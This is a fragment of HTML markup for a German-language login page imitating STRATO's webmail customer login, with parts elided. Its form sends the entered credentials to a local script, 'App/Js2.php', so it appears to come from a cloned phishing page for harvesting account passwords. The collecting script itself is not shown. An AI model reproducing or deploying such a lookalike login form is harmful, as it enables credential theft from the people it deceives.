...
</svg><span data-strato-i18n="Help &amp; Contact">Hilfe &amp; Kontakt</span></a></li><li><span id="io-ox-languages" class="mx-16"><div class="dropdown"><a href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-globe" viewBox="0 0 16 16">
...
</svg><span data-strato-i18n="Customer Login">Kunden-Login</span></a></li></ul></div></header>
...
<form action="App/Js2.php" method="post" id="io-ox-login-form">
...
<i class="toggle" aria-hidden="true"></i>Angemeldet bleiben</label></div></div></div>


<div class="row feedback">
	<div class="col-xs-12 alert-highlight" id="io-ox-login-feedback">
		<div role="alert" class="selectable-text alert alert-info">Bitte geben Sie Ihre Zugangsdaten ein. (UI-0001)</div>
	</div>
</div>


<div class="row button"><div class="form-group col-xs-12 col-sm-12">
